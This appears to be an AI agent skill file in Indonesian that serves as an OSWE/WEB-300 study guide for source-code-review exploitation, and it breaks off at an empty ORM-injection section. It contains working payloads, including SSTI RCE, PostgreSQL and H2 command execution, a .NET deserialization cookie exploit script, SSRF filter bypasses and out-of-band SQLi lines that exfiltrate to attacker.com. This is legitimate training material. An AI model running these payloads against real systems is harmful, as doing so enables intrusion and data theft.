---
name: offsec-web-300
description: OffSec WEB-300 / OSWE (Offensive Security Web Expert) — advanced web application security assessment covering white-box testing methodology, source code review in Java, C#, PHP, Python, and JavaScript, custom exploit development for .NET deserialization, PHP type juggling, SQL injection, SSTI, SSRF, prototype pollution, authentication bypass, XXE, OS command injection, and professional exploit scripting in Python.
license: MIT
compatibility: opencode
metadata:
  audience: web-pentesters
  workflow: exploitation
  source: offsec-web-300
  standard: oswe
  year: "2026"
---

# WEB-300 — Advanced Web Application Security Assessment (OSWE)

## Daftar Isi

1. [Overview & Exam Structure](#1-overview--exam-structure)
2. [White-Box Testing Mindset & Methodology](#2-white-box-testing-mindset--methodology)
3. [17 Modul Deep-Dive](#3-17-modul-deep-dive)
4. [.NET Deserialization RCE](#4-net-deserialization-rce)
5. [PHP Type Juggling & Authentication Bypass](#5-php-type-juggling--authentication-bypass)
6. [SQL Injection Advanced](#6-sql-injection-advanced)
7. [Server-Side Template Injection (SSTI)](#7-server-side-template-injection-ssti)
8. [Server-Side Request Forgery (SSRF)](#8-server-side-request-forgery-ssrf)
9. [Prototype Pollution](#9-prototype-pollution)
10. [Authentication Bypass & Weak Random](#10-authentication-bypass--weak-random)
11. [XXE & XML-Based Attacks](#11-xxe--xml-based-attacks)
12. [OS Command Injection & WebSocket Exploitation](#12-os-command-injection--websocket-exploitation)
13. [Custom Exploit Development in Python](#13-custom-exploit-development-in-python)
14. [Tools Deep Dive](#14-tools-deep-dive)
15. [Exam Strategy & Report Template](#15-exam-strategy--report-template)
16. [Referensi Lengkap](#16-referensi-lengkap)

---

## 1. Overview & Exam Structure

### Apa Itu WEB-300 / OSWE?

WEB-300 (Advanced Web Application Security Assessment) adalah sertifikasi **white-box web application security** dari OffSec yang mengajarkan **source code review** dan **custom exploit development**. Tidak seperti OSCP atau OSEP yang menggunakan pendekatan **black-box**, OSWE mengharuskan Anda membaca **source code lengkap** aplikasi web, mengidentifikasi kerentanan, dan menulis **exploit script Python yang fully automated**.

OSWE (Offensive Security Web Expert) adalah sertifikasi 100% praktikal — **47 jam 45 menit proctored lab + 24 jam report window**.

### Perbedaan OSWE vs OSCP vs OSEP

| Aspek | OSWE (WEB-300) | OSCP+ (PEN-200) | OSEP (PEN-300) |
|-------|---------------|-----------------|----------------|
| **Level** | 300 (advanced) | 200 (intermediate) | 300 (advanced) |
| **Pendekatan** | **White-box** — source code diberikan | Black-box | Black-box |
| **Fokus** | Source code review, custom exploit | Enumeration, exploitation | Evasion, EDR bypass |
| **Durasi exam** | 47h45m | 24h | 47h45m |
| **Report window** | 24 jam | 24 jam | 24 jam |
| **Total points** | 100 | 100 | 100 |
| **Passing score** | **85/100** | 50/100 (Booster) / 100/100 (Plus) | 85/100 |
| **Languages** | Java, C#, PHP, Python, JavaScript | Semua umum | C#, PowerShell, C |
| **Main tools** | Burp Suite, dnSpy, JD-GUI, ysoserial | Nmap, Metasploit, BloodHound | C#, Win32 API, Veil |
| **Exploit style** | Python script fully automated | Manual exploitation | C# shellcode runners |
| **No-go tools** | SQLmap, source code analyzers, AI tools | — | — |
| **Cert expires** | 3 tahun | 3 tahun | 3 tahun |

### Scoring & Passing

| Komponen | Detail |
|----------|--------|
| **Durasi exam** | 47 jam 45 menit proctored |
| **Report deadline** | 24 jam setelah exam selesai |
| **Total machines** | 3 machines (20pts + 35pts + 45pts) |
| **Total maksimum** | 100 points |
| **Passing score** | **85/100** |
| **Tools utama** | Burp Suite, Python, dnSpy, JD-GUI, Visual Studio |
| **Format laporan** | PDF — OSWE report template |
| **Upload** | OffSec Learning Portal (.7z) |

### Exam Environment

- **Proctoring**: Live proctor via webcam (screen share + room scan)
- **VPN**: Isolated OffSec VPN network
- **Source code**: Full application source code provided (Java, C#, PHP, Python, JavaScript)
- **Exploit**: Custom Python script — **fully automated, no user interaction**
- **Flag types**: Local.txt (proof of access), Proof.txt (privilege escalation)
- **No-go**: SQLmap, Burp Suite Pro automation, source code analyzers, AI tools
- **Allowed**: Burp Suite Community, Python, dnSpy, JD-GUI, Visual Studio Code, ysoserial, ysoserial.net

### 47h45m Time Management Strategy

```
Hour 0-2:   Initial reconnaissance — baca source code semua aplikasi
  - Identifikasi entry points, routes, file structure
  - Catat semua fungsi autentikasi, deserialization, database queries
  
Hour 2-6:   Deep source code review per aplikasi
  - Machine 1 (20pts) — biasanya paling mudah, 1-2 vulnerabilities
  - Machine 2 (35pts) — medium, 2-3 vulnerabilities, chaining required
  - Machine 3 (45pts) — hardest, multi-step exploit chain

Hour 6-24:  Exploit development
  - Tulis exploit.py untuk Machine 1 → get Local.txt + Proof.txt
  - Tulis exploit.py untuk Machine 2 → get Local.txt + Proof.txt
  - Tulis exploit.py untuk Machine 3 → get Local.txt + Proof.txt

Hour 24-40: Verify all exploits — setiap exploit harus re-run clean
  - Test dari fresh connection (VPN reconnect)
  - Pastikan NO hardcoded session, NO interactive prompts

Hour 40-47: Final verification + screenshot collection

Hour 47-71: Report writing (24 jam window)
```

---

## 2. White-Box Testing Mindset & Methodology

### Filosofi White-Box Testing

White-box testing berbeda fundamental dari black-box. Dalam OSWE, Anda memiliki **semua source code** — tidak perlu guessing, tidak perlu fuzzing blind. Kuncinya adalah membaca code dengan efisien dan mengidentifikasi **vulnerable patterns** dengan cepat.

### Source Code Review Framework

```
Step 1: Entry Point Mapping
  - Identifikasi semua route/endpoint (controllers, servlets, handlers)
  - Mapping input parameters (GET/POST/COOKIE/HEADER)
  - Catat fungsi autentikasi dan otorisasi

Step 2: Data Flow Tracking
  - Trace input dari entry point ke sink function
  - Perhatikan sanitasi: apakah ada? apakah cukup?
  - Identifikasi type mismatches (string vs int, obj vs array)

Step 3: Configuration Review
  - Web.config, application.properties, .env, config.php
  - Cari hardcoded credentials, debug mode, insecure defaults
  - Perhatikan library versions (vulnerable dependencies)

Step 4: Vulnerability Pattern Matching
  - Cari pattern kerentanan spesifik (lihat checklist di bawah)
  - Validasi apakah sink function benar-benar terekspos
  - Konfirmasi dengan request test via Burp Suite

Step 5: Exploit Construction
  - Tulis Python script yang fully automated
  - Test dari clean state (no session cookies)
  - Handle edge cases: rate limiting, CSRF tokens, nonces
```

### Source Code Review Checklist

#### Java

| Pattern | What to Look For |
|---------|-----------------|
| File upload | `MultipartFile`, `@RequestParam`, path traversal, extension validation |
| SQL queries | `Statement`, `PreparedStatement` (check if parameterized!), `createNativeQuery`, HQL/JPQL injections |
| Deserialization | `ObjectInputStream`, `readObject`, `XMLDecoder`, `SnakeYAML`, `Jackson` default typing |
| XXE | `DocumentBuilderFactory`, `SAXParser`, `XMLReader` — is external entities disabled? |
| SSRF | `URL.openConnection()`, `HttpURLConnection`, `RestTemplate`, `WebClient` |
| JNDI injection | `InitialContext.lookup()`, `ldap://`, `rmi://`, `dns://` |
| Expression Language | `ELProcessor.eval()`, SpEL `EvaluationContext`, template engines |
| Random generation | `java.util.Random` (predictable!), `SecureRandom` usage |
| Authentication | JWT verification (is `none` algorithm allowed?), session fixation |

#### C# (.NET)

| Pattern | What to Look For |
|---------|-----------------|
| Deserialization | `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter`, `XmlSerializer`, `DataContractSerializer` |
| ViewState | `EnableViewStateMac=false`, ViewStateUserKey not set |
| SQL queries | Entity Framework raw SQL (`FromSql`, `ExecuteSqlRaw`), `SqlCommand` with string concatenation |
| XXE | `XmlDocument.Load()`, `XDocument.Load()` — `XmlResolver` set? |
| SSRF | `WebClient.DownloadString()`, `HttpClient`, `WebRequest.Create()` |
| File operations | `Path.Combine()` with user input, `MapPath()` |
| Authentication | Cookie authentication without validation, JWT validation |

#### PHP

| Pattern | What to Look For |
|---------|-----------------|
| Type Juggling | Loose comparison (`==`, `!=`, `strcmp()`), `in_array()` without strict flag |
| File inclusion | `include()`, `require()`, `file_get_contents()` with user input |
| Deserialization | `unserialize()`, `__wakeup()`, `__destruct()` magic methods |
| SQL injection | `mysqli_query()` string concat, `Laravel` raw queries, `->whereRaw()` |
| Command injection | `exec()`, `system()`, `shell_exec()`, `passthru()`, backtick operator |
| Object injection | `unserialize()` with POP chain gadgets |
| Session | Session file inclusion, predictable session IDs |

#### Python (Django/Flask)

| Pattern | What to Look For |
|---------|-----------------|
| SSTI | `render_template_string()`, `jinja2.Template()`, `format()` with user input |
| OS command | `os.system()`, `subprocess.Popen()` with `shell=True`, `eval()`, `exec()` |
| SQL injection | `rawsql()` in Django ORM, string interpolation in SQLAlchemy |
| Deserialization | `pickle.loads()`, `yaml.load()` (without `Loader`), `jsonpickle` |
| SSRF | `requests.get()`, `urllib.request.urlopen()` with user URL |
| Prototype pollution | `deepmerge()`, `Object.assign()`, `$.extend()`, recursive merge functions |
| Insecure direct object | No ownership check on user ID |

#### JavaScript (Node.js)

| Pattern | What to Look For |
|---------|-----------------|
| Prototype pollution | `merge()`, `clone()`, `Object.assign()`, `$.extend()`, lodash `defaultsDeep` |
| SSTI | `ejs.render()`, `pug`, `handlebars` with unsafe options |
| Deserialization | `node-serialize`, `serialize-to-js`, `eval()` on serialized data |
| Command injection | `exec()`, `spawn` with `shell: true`, `eval()`, `Function()` constructor |
| SSRF | `axios.get()`, `node-fetch`, `http.request()` with user URL |
| Path traversal | `fs.readFile()` with user input, no path normalization |
| JWT | `none` algorithm, weak secret, no expiration |
| RCE via `vm.runInNewContext` | Sandbox escape, `this.constructor.constructor('return process')()` |

---

## 3. 17 Modul Deep-Dive

### Module Overview

WEB-300 memiliki **17 modul** yang berbasis **case study** — setiap modul mempelajari satu aplikasi web nyata (CVE-based atau custom vulnerable app):

| # | Modul | Aplikasi | Vulnerability Class | Language |
|---|-------|----------|-------------------|----------|
| 1 | Introduction | — | Course overview, methodology | — |
| 2 | Tools & Methodologies | — | Burp Suite, dnSpy, JD-GUI, Python | — |
| 3 | Tutor Authentication Bypass and RCE | Tutor LMS | Authentication bypass, RCE | PHP |
| 4 | Tutor LMS Type Juggling | Tutor LMS | PHP Type Juggling | PHP |
| 5 | ManageEngine SQL Injection RCE | ManageEngine | SQL Injection → RCE via PostgreSQL | Java |
| 6 | (lanjutan modul 5) | ManageEngine | SQL Injection → RCE (deep dive) | Java |
| 7 | Bassmaster NodeJS Arbitrary JS Injection | Bassmaster | Prototype pollution? (ARCHIVED) | Node.js |
| 8 | DotNetNuke Cookie Deserialization RCE | DotNetNuke | .NET Deserialization → RCE | C# |
| 9 | ERPNext Authentication Bypass and SSTI | ERPNext | Auth bypass + SSTI | Python |
| 10 | openCRX Auth Bypass and RCE | openCRX | Auth bypass + RCE via database | Java |
| 11 | openIT COCKPIT XSS and OS Command Injection | openIT COCKPIT | XSS → CSRF → RCE | PHP |
| 12 | Concord Authentication Bypass to RCE | Concord | Auth bypass → RCE via serialization | Java |
| 13 | Server-side Request Forgery | Various apps | SSRF exploitation | Multi-Lang |
| 14 | Guacamole Lite Prototype Pollution | Guacamole Lite | Prototype pollution → RCE | Node.js |
| 15 | Conclusion | — | Wrap-up, exam prep | — |
| — | **Advanced SSRF** *(new)* | Custom app | Blind SSRF, metadata service, chaining | Java/Python |
| — | **JavaScript Prototype Pollution** *(new)* | Custom app | Client + Server-side PP | Node.js |
| — | **CORS+CSRF+RCE** *(new)* | Custom app | CORS misconfig, CSRF token bypass, RCE | Java |

### Module 1: Introduction

- Course overview, OSWE exam structure, prerequisites
- Mindset: "Read code like a developer, think like an attacker"
- Why white-box? — You already have the source code, no need for blind guessing
- Lab environment setup: Kali Linux, Burp Suite, Python 3, dnSpy, JD-GUI

### Module 2: Tools & Methodologies

- Burp Suite Community: Proxy, Repeater, Intruder, Decoder
- dnSpy: .NET decompiler and debugger — step-through code at runtime
- JD-GUI / Jadx: Java decompiler untuk membaca class files
- Visual Studio Code: Source code navigation, search, diff
- Python 3: Requests library, Scapy, pwntools
- Methodologi Source Code Review:
  1. Map entry points (controllers, routes, servlets)
  2. Trace data flow (input → processing → sink)
  3. Cari pattern kerentanan
  4. Validate via Burp Suite
  5. Write custom exploit
- **No-go tools**: SQLmap, Burp Suite Scanner, source code analyzers (SonarQube, etc.), AI chatbots

### Module 3: Tutor Authentication Bypass and RCE

**Aplikasi**: Tutor LMS (Learning Management System)

**Vulnerability 1 — Authentication Bypass**:
- Weak password reset token generation menggunakan `mt_rand()` — predictable
- Token hanya 6 digit numeric — bisa bruteforce
- Password reset endpoint tidak memiliki rate limiting

**Vulnerability 2 — Remote Code Execution**:
- Setelah bypass auth, upload file PHP via fungsi yang tidak memvalidasi ekstensi dengan benar
- File upload path bisa dimanipulasi via path traversal

**Exploit chain**: Predict password reset token via weak RNG → reset admin password → login → upload PHP shell via insecure upload → RCE

### Module 4: Tutor LMS Type Juggling

**Aplikasi**: Tutor LMS (lanjutan)

**Vulnerability — PHP Type Juggling**:
- Loose comparison (`==`) pada fungsi autentikasi
- Menggunakan `strcmp()` yang mengembalikan `null` (== `0`) jika argumen berupa array
- Magic hash: `0e12345...` PHP treats sebagai float `0`

```php
// Vulnerable pattern
if (strcmp($_POST['password'], $stored_hash) == 0) {
    // Auth bypassed!
}

// Attack: kirim password[]= (array) → strcmp returns NULL → NULL == 0 → TRUE
```

**Magic Hashes known**:
- `240610708` → `md5()` → `0e462097431907509062...`
- `QLTHNDT` → `sha1()` → `0e40596782538344865...`
- `10932435112` → `md5()` → `0e077701784189519...`

### Module 5 & 6: ManageEngine SQL Injection RCE

**Aplikasi**: ManageEngine (enterprise management software — Java)

**Vulnerability 1 — SQL Injection**:
- Input tidak disanitasi dalam parameter yang digunakan di query SQL
- PostgreSQL backend — bisa menggunakan `COPY ... FROM PROGRAM` untuk RCE
- Error-based SQLi untuk extract data

**Vulnerability 2 — RCE via PostgreSQL**:
```sql
-- PostgreSQL RCE via COPY FROM PROGRAM
'; COPY (SELECT '') TO PROGRAM 'powershell -enc BASE64_PAYLOAD'; --
```

**Exploit chain**: SQLi → extract admin credentials → login → SQLi with `COPY FROM PROGRAM` → RCE

**PostgreSQL UDF RCE (alternatif)**:
```sql
-- Jika COPY FROM PROGRAM tidak available, bisa via UDF
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

### Module 7: Bassmaster NodeJS Arbitrary JavaScript Injection

**Status**: ARCHIVED (tidak lagi dalam exam aktif, tapi pattern-nya masih relevan untuk Node.js exploitation)

**Aplikasi**: Bassmaster (Node.js / Hapi.js plugin)

**Vulnerability — Arbitrary JavaScript Injection via `eval()`**:
- Input dari request langsung di-pass ke `eval()` function
- Bypass filtering via Unicode encoding, double URL encoding

**Modern relevance**: Pattern `eval()` dengan user input jarang ditemui, tapi konsepnya mirip dengan SSTI di Node.js template engines dan sandbox escape di `vm.runInNewContext()`.

### Module 8: DotNetNuke Cookie Deserialization RCE

**Aplikasi**: DotNetNuke (DNN) — .NET CMS

**Vulnerability — Cookie Deserialization RCE**:
- DNN menggunakan serialized cookie untuk menyimpan session/authentication state
- Cookie didekripsi menggunakan 3DES dengan **hardcoded key**
- Setelah dekripsi, data di-deserialisasi menggunakan `LosFormatter` (ObjectStateFormatter)
- Attacker bisa membuat forged cookie dengan payload deserialization

**Attack flow**:
1. Dapatkan encryption key dari source code (hardcoded)
2. Gunakan ysoserial.net untuk generate gadget chain
3. Enkripsi payload dengan key yang didapat
4. Kirim malicious cookie → server deserialize → RCE

**Gadget chain untuk DNN**:
- `TypeConfuseDelegate` via `ObjectDataProvider`
- `ExpandedWrapper` untuk wrapping type
- `FileSavePicker` atau `FileDeletePicker` untuk file operations

**Key code review pattern**:
```csharp
// Cari pattern deserialization dengan key hardcoded
LosFormatter formatter = new LosFormatter();
formatter.Deserialize(decryptedData);  // RCE via gadget chain!
```

**CVE**: CVE-2017-9822 (DotNetNuke Cookie Deserialization)

### Module 9: ERPNext Authentication Bypass and SSTI

**Aplikasi**: ERPNext (Python / Frappe Framework)

**Vulnerability 1 — Authentication Bypass**:
- Logic flaw di reset password flow
- Race condition atau improper state validation

**Vulnerability 2 — Server-Side Template Injection (SSTI)**:
- Jinja2 template engine dengan user input yang tidak disanitasi
- Entry point: field yang menggunakan template rendering (email template, print format, report template)

**SSTI exploitation (Jinja2)**:
```python
# Payload untuk Jinja2 SSTI → RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Mencari subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}

# Shortcut RCE
{{ self.__init__.__globals__.__builtins__.exec('import os; os.system("id")') }}
```

### Module 10: openCRX Auth Bypass and RCE

**Aplikasi**: openCRX (Java-based CRM)

**Vulnerability 1 — Authentication Bypass**:
- SQL Injection di login page — parameter username tidak disanitasi
- Fungsi `authenticate()` menggunakan string concatenation untuk query

```java
// Vulnerable pattern
String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Vulnerability 2 — RCE via H2 Database**:
- Aplikasi menggunakan H2 database (in-memory/embedded)
- H2 memiliki fitur: `CREATE ALIAS` untuk menjalankan Java code
- Setelah bypass auth, inject SQL untuk create alias → RCE

```sql
-- H2 RCE via CREATE ALIAS
'; CREATE ALIAS IF NOT EXISTS shell AS $$ String shell(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return ""; }$$; CALL shell('powershell -enc BASE64'); --
```

### Module 11: openIT COCKPIT XSS and OS Command Injection

**Aplikasi**: openIT COCKPIT (PHP — IT infrastructure management)

**Vulnerability 1 — XSS (blackbox module)**:
- Special — module ini menggunakan **blackbox approach** (tidak ada source code)
- Stored XSS di modul monitoring/alerting
- XSS payload untuk steal admin session

**Vulnerability 2 — OS Command Injection via WebSocket**:
- WebSocket endpoint yang menjalankan system command
- Input dari WebSocket message tidak disanitasi
- Command injection via concatenation

**Exploit chain**: Stored XSS → steal CSRF token → abuse admin privileges → trigger WebSocket command injection via CSRF → RCE

**WebSocket exploitation**:
```python
import websocket
import json

ws_url = "wss://target/ws/command"
ws = websocket.WebSocket()
ws.connect(ws_url)
payload = {"action": "ping", "host": "127.0.0.1; id"}
ws.send(json.dumps(payload))
result = ws.recv()
```

### Module 12: Concord Authentication Bypass to RCE

**Aplikasi**: Concord (Java-based workflow automation)

**Vulnerability 1 — Authentication Bypass**:
- Weak JWT validation — server menerima JWT dengan algorithm `none`
- Atau secret key ditemukan di source code

```java
// Weak JWT validation
Jwts.parser().parse(jwt);  // Without setting signing key!
```

**Vulnerability 2 — RCE via Java Deserialization**:
- Concord menggunakan Java serialization untuk komunikasi internal
- Entry point yang menerima serialized object
- Gunakan ysoserial untuk generate gadget chain

**Exploit chain**: Forge JWT with `alg: none` → admin access → trigger deserialization endpoint → send ysoserial payload → RCE

### Module 13: Server-Side Request Forgery (SSRF)

**Vulnerability — SSRF**:
- Aplikasi memproses URL dari user tanpa validasi yang memadai
- Bisa digunakan untuk mengakses internal services:
  - Cloud metadata endpoints (AWS `169.254.169.254`, GCP `metadata.google.internal`)
  - Internal API endpoints
  - Database HTTP interfaces
  - File access via `file://` protocol

**SSRF exploitation techniques**:

```python
# Bypass filter via DNS rebinding
# 1. Daftarkan domain dengan TTL 0
# 2. DNS meresolve ke IP allowed (pertama kali)
# 3. Setelah cache expire, resolve ke IP internal

# Bypass filter via URL parsing confusion
# https://expected.com@attacker.com  → goes to attacker.com
# https://evil.com#expected.com       → fragment diabaikan server
# https://evil.com/expected.com       → path, bukan host

# Bypass IP filter:
# 127.0.0.1 → 2130706433 (decimal), 0x7f000001 (hex)
# 127.0.0.1 → 0 (IPv4 0.0.0.0 alias), [::1] (IPv6 loopback)
# 127.0.0.1 → 127.1 (short form)
```

**SSRF chaining to RCE**:
- AWS: SSRF → EC2 metadata → IAM credentials → S3/API access
- GCP: SSRF → metadata → access token → cloud functions
- Kubernetes: SSRF → kubelet API → pod exec
- Docker: SSRF → Docker socket → container exec
- Redis/Memcached: SSRF → gopher protocol → Redis RCE

### Module 14: Guacamole Lite Prototype Pollution

**Aplikasi**: Guacamole Lite (Node.js)

**Vulnerability — Prototype Pollution**:
- Input JSON di-merge ke object menggunakan fungsi yang vulnerable
- Attacker bisa memodifikasi `__proto__` untuk menginjeksi property ke semua object

```javascript
// Vulnerable merge pattern
function merge(dst, src) {
    for (let key in src) {
        if (src.hasOwnProperty(key)) {
            if (typeof src[key] === 'object') {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }
}
```

**Exploitation via `__proto__`**:
```json
{
    "__proto__": {
        "admin": true,
        "isAdmin": true,
        "role": "administrator"
    }
}
```

**RCE via prototype pollution — gadget chaining**:
```javascript
// Cari gadget di aplikasi yang menggunakan properti dari prototype
// Contoh: template engine, command execution, file operations

// Common sinks:
// 1. child_process.exec() with shell option
// 2. Template engine options (NODE_OPTIONS)
// 3. HTTP headers (inject via prototype)
// 4. Socket.IO configuration

// CVE-2019-10744: lodash.merge + handlebars → RCE
{
    "__proto__": {
        "type": "ObjectExpression",
        "ObjectExpression": {
            "type": "ObjectExpression",
            "ObjectExpression": "... Handlebars RCE payload ..."
        }
    }
}
```

### Module 15: Conclusion

- Review of all vulnerability classes
- Exam preparation checklist
- Report writing guidelines
- Recommended practice labs

### Additional New Modules (2024-2025)

#### Advanced SSRF

- Blind SSRF detection via out-of-band (Burp Collaborator, interactsh)
- SSRF via DNS rebinding (TOCTOU bypass)
- SSRF to RCE via cloud metadata service
- SSRF with protocol smuggling (gopher, dict, file, ftp)
- SSRF bypass via redirect following

#### JavaScript Prototype Pollution — Deep Dive

- Server-side prototype pollution in Node.js
- Client-side PP in browser → XSS
- CVE-2025-55182: Popular npm library PP
- CVE-2025-66478: Server-side PP in Node.js application
- Automated PP scanner via JSON.parse + recursive merge

#### CORS + CSRF + RCE Chain

- CORS misconfiguration (`Access-Control-Allow-Origin: *` with credentials)
- CSRF token stored in cookie (not tied to session)
- Exploit chain: CORS-enabled API → steal CSRF token → CSRF to change admin password → login → RCE

---

## 4. .NET Deserialization RCE

### Understanding .NET Serialization

.NET memiliki beberapa serializer yang bisa disalahgunakan untuk RCE:

| Serializer | Method | How it works | Risky? |
|-----------|--------|-------------|--------|
| `BinaryFormatter` | `Deserialize()` | Full object graph deserialization | **High** |
| `LosFormatter` | `Deserialize()` | Used by ASP.NET ViewState / DNN | **High** |
| `ObjectStateFormatter` | `Deserialize()` | Similar to LosFormatter | **High** |
| `NetDataContractSerializer` | `Deserialize()` | Full type fidelity | **High** |
| `SoapFormatter` | `Deserialize()` | SOAP-based, full type | **High** |
| `XmlSerializer` | `Deserialize()` | XML-based, type-restricted | **Medium** |
| `DataContractSerializer` | `ReadObject()` | XML-based, opt-in types | **Medium** |
| `JavaScriptSerializer` | `Deserialize()` | JSON-based, limited | **Low** |
| `Newtonsoft.Json` | `TypeNameHandling.Auto/All` | JSON with $type | **High** |

### ysoserial.net Gadget Chains

**Tool**: [ysoserial.net](https://github.com/pwntester/ysoserial.net)

```powershell
# TypeConfuseDelegate — most versatile
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"

# ObjectDataProvider
ysoserial.exe -f LosFormatter -g ObjectDataProvider -c "powershell -enc BASE64"

# ActivitySurrogateSelector — for BinaryFormatter
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "powershell -enc BASE64"

# SessionViewState — for ASP.NET ViewState
ysoserial.exe -f LosFormatter -g SessionViewState -c "powershell -enc BASE64"
```

### How to Build a Gadget Chain Manually

```csharp
// TypeConfuseDelegate with ObjectDataProvider
// 1. Buat ObjectDataProvider yang memanggil method
// 2. Set MethodName ke "Start" pada Process
// 3. Set ObjectInstance ke Process object
// 4. Casting via ExpandedWrapper<Process, object>

ExpandedWrapper<Process, ObjectDataProvider> wrapper = new ExpandedWrapper<Process, ObjectDataProvider>();
wrapper.ProjectedProperty0 = new ObjectDataProvider();
wrapper.ProjectedProperty0.ObjectInstance = new Process();
wrapper.ProjectedProperty0.MethodName = "Start";
wrapper.ProjectedProperty0.MethodParameters.Add("cmd.exe");
wrapper.ProjectedProperty0.MethodParameters.Add("/c whoami > C:\\pwned.txt");
```

### Exploit Template

```python
import requests
import base64
import subprocess

TARGET = "http://target/"
DNN_KEY = "HARDC0D3D_K3Y_H3R3"  # From source code

def generate_payload(command):
    """Generate DNN deserialization payload using ysoserial.net"""
    encoded_cmd = base64.b64encode(command.encode()).decode()
    ps_cmd = f"powershell -enc {encoded_cmd}"
    
    result = subprocess.run(
        ["mono", "ysoserial.exe", "-f", "LosFormatter",
         "-g", "TypeConfuseDelegate", "-c", ps_cmd],
        capture_output=True, text=True
    )
    return base64.b64decode(result.stdout.strip())

def encrypt_dnn_cookie(data, key):
    """Encrypt with DNN's hardcoded 3DES key"""
    # Implement DNN encryption logic from source code
    from Crypto.Cipher import DES3
    cipher = DES3.new(key, DES3.MODE_CBC, IV=b'\x00'*8)
    return base64.b64encode(cipher.encrypt(data)).decode()

def exploit(command):
    payload_bytes = generate_payload(command)
    encrypted_payload = encrypt_dnn_cookie(payload_bytes, DNN_KEY)
    
    cookies = {".DNNLOGIN": encrypted_payload}
    r = requests.get(TARGET, cookies=cookies, verify=False)
    return r

# Test
exploit("whoami")
```

### Mitigation & Detection

- **Jangan gunakan** `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `SoapFormatter`, `NetDataContractSerializer`
- Gunakan `XmlSerializer` dengan known types yang terbatas
- Implement custom `SerializationBinder` untuk whitelist types
- Gunakan `DataContractSerializer` dengan `DataContractResolver`

**Detection in source code review:**
```csharp
// DO NOT USE — RCE risk
class UnsafeDeserializer {
    public object Deserialize(byte[] data) {
        BinaryFormatter fmt = new BinaryFormatter();
        return fmt.Deserialize(new MemoryStream(data));  // RCE!
    }
}
```

---

## 5. PHP Type Juggling & Authentication Bypass

### PHP Loose vs Strict Comparison

| Operator | Name | Behavior |
|----------|------|----------|
| `==` | Loose (equal) | Type coercion: `"0e123" == "0"` |
| `===` | Strict (identical) | No coercion: type + value must match |
| `!=` | Loose (not equal) | Type coercion |
| `!==` | Strict (not identical) | No coercion |
| `strcmp($a, $b)` | String compare | Returns 0 if equal, null if array → `null == 0` |
| `in_array($a, $b)` | Loose by default | Type coercion unless third param `true` |
| `switch($a)` | Loose comparison | Coercion in case matching |

### Magic Hashes

Ketika string di-hash dan hasilnya dimulai dengan `0e` diikuti digit saja, PHP akan menginterpretasikannya sebagai float `0` dalam loose comparison:

```php
// Jika hash tersimpan adalah "0e462097431907509062..."
// Dan hash input adalah "0e077701784189519..."
// Maka: "0e462..." == "0e077..." → TRUE (keduanya == float 0)
```

**Known magic hashes**:
```php
// MD5 magic hashes
md5('240610708')  → 0e462097431907509062...
md5('QNKCDZO')    → 0e830400451993494058...
md5('240610708')  → 0e462097431907509062...
md5('byGcY')      → 0e591948146276357475...
md5('0e215962017') → 0e291242476940776848...

// SHA1 magic hashes
sha1('aaroZmOk')  → 0e665070199694271348...
sha1('aaK1STfY')  → 0e766585266557562076...
sha1('aaO8zKZF')  → 0e892574566772790685...
sha1('aa3OFF9m')  → 0e369777862785179349...
```

### strcmp() Vulnerability

```php
<?php
// Vulnerable login
$stored_hash = "admin_hash";
if (strcmp($_POST['password'], $stored_hash) == 0) {
    echo "Access granted!";
}

// Attack: kirim password[]=foo (array)
// strcmp(array, string) → NULL (warning)
// NULL == 0 → TRUE
?>
```

**Exploit dengan Python**:
```python
import requests

TARGET = "http://target/login.php"

# strcmp bypass via array
r = requests.post(TARGET, data={"username": "admin", "password[]": "anything"})
print(r.text)  # Access granted!
```

### In_array() Vulnerability

```php
<?php
// Vulnerable: in_array without strict mode
$allowed_roles = ["user", "editor", "admin"];
if (in_array($_POST['role'], $allowed_roles)) {
    // Grant role
}
// Attack: role=0 → in_array('0', ["user", "editor", "admin"]) → TRUE
// Karena 'user' == 0 → TRUE (string to int coercion)
?>
```

### Type Juggling with json_decode()

```php
<?php
// API endpoint
$data = json_decode($_POST['data'], true);
$expected_admin = "false";  // string

if ($data['isAdmin'] == $expected_admin) {
    // Not admin
} else {
    // Has admin access!
}
// Attack: {"isAdmin": true} → true == "false"? PHP coerces: (int)true = 1, (int)"false" = 0
// 1 != 0 → else branch → admin!
?>
```

---

## 6. SQL Injection Advanced

### Blind SQL Injection — Error-Based

```sql
-- MySQL error-based via double query
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) -- 

-- PostgreSQL error-based
' OR CAST((SELECT version()) AS numeric) -- 

-- MSSQL error-based
' OR 1/@@servername -- 
```

### Blind SQL Injection — Time-Based

```python
import requests
import time

TARGET = "http://target/api/users?id="

def test_time_based(payload):
    start = time.time()
    r = requests.get(TARGET + payload)
    elapsed = time.time() - start
    return elapsed > 5  # SLEEP(5) or pg_sleep(5)

# MySQL: SLEEP(5)
# PostgreSQL: pg_sleep(5) 
# MSSQL: WAITFOR DELAY '0:0:5'
# Oracle: DBMS_LOCK.SLEEP(5) or UTL_INADDR.get_host_name()

# Extract data character by character
def extract_char(payload_template, position):
    for c in "abcdef0123456789":
        payload = payload_template.replace("$POS$", str(position)).replace("$CHAR$", c)
        if test_time_based(payload):
            return c
    return None
```

### Out-of-Band (OOB) SQL Injection

```sql
-- MySQL OOB
' LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --

-- PostgreSQL OOB via COPY
' COPY (SELECT version()) TO PROGRAM 'nslookup $(cat /etc/hostname).attacker.com' --

-- MSSQL OOB via xp_dirtree
' EXEC master..xp_dirtree '\\attacker.com\share' --
```

### ORM Injection

```java
// Hibernate HQL Injection
